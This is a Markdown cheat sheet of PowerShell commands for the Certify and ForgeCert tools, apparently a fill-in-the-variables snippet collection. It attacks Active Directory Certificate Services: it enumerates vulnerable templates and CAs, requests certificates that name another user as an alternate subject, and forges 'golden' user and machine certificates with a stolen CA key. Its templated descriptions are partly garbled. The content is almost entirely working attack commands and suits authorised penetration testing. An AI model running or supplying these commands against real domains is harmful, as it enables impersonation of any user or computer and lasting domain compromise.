# Certify / ForgeCert

## Certify - enumerate

### Find vulnerable templates

Find vulnerable templates with Certify / ForgeCert.

```powershell title:"Certify / ForgeCert Find Vulnerable Templates"
.\Certify.exe find /vulnerable /enabled
```
<!-- cheat -->

### Find templates and ACLs

Find templates and ACLs with Certify / ForgeCert.

```powershell title:"Certify / ForgeCert Find Templates and ACLs"
.\Certify.exe find
```
<!-- cheat -->

### Enumerate CAs

Enumerate CAs with Certify / ForgeCert.

```powershell title:"Certify / ForgeCert Enumerate CAs"
.\Certify.exe cas
```
<!-- cheat -->

### Enumerate web enrollment

Enumerate web enrollment with Certify / ForgeCert.

```powershell title:"Certify / ForgeCert Enumerate Web Enrollment"
.\Certify.exe cas /enrolleeSuppliesSubject
```
<!-- cheat -->

## Certify - request

### Request cert with SAN

Run request cert with SAN with Certify / ForgeCert.

```powershell title:"Certify / ForgeCert Run Request Cert with SAN"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"$target_user"
```
<!-- cheat
var domain
var ca_name
var template_name
var target_user
-->

### Request User cert

Read request user cert with Certify / ForgeCert.

```powershell title:"Certify / ForgeCert Read Request User Cert"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"User"
```
<!-- cheat
var domain
var ca_name
-->

### Request SubCA cert

Read request SubCA cert with Certify / ForgeCert.

```powershell title:"Certify / ForgeCert Read Request SubCA Cert"
.\Certify.exe request /ca:"$ca_fqdn\$ca_name" /template:SubCA /altname:"$target_user"
```
<!-- cheat
var ca_fqdn
var ca_name
var target_user
-->

### Download issued request

Download issued request with Certify / ForgeCert.

```powershell title:"Certify / ForgeCert Download Issued Request"
.\Certify.exe download /ca:"$ca_fqdn\$ca_name" /id:$request_id
```
<!-- cheat
var ca_fqdn
var ca_name
var request_id
-->

## ForgeCert

### Forge golden certificate

Read forge golden certificate with Certify / ForgeCert.

```powershell title:"Certify / ForgeCert Read Forge Golden Certificate"
.\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$target_user" --SubjectAltName "$target_upn" --NewCertPath "$new_pfx" --NewCertPassword "$new_pfx_pass"
```
<!-- cheat
var ca_pfx
var ca_pfx_pass
var target_user
var target_upn
var new_pfx
var new_pfx_pass
-->

### Forge machine certificate

Read forge machine certificate with Certify / ForgeCert.

```powershell title:"Certify / ForgeCert Read Forge Machine Certificate"
.\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$computer_name" --SubjectAltName "$computer_name@$domain" --NewCertPath "$new_pfx" --NewCertPassword "$new_pfx_pass"
```
<!-- cheat
var ca_pfx
var ca_pfx_pass
var computer_name
var domain
var new_pfx
var new_pfx_pass
-->
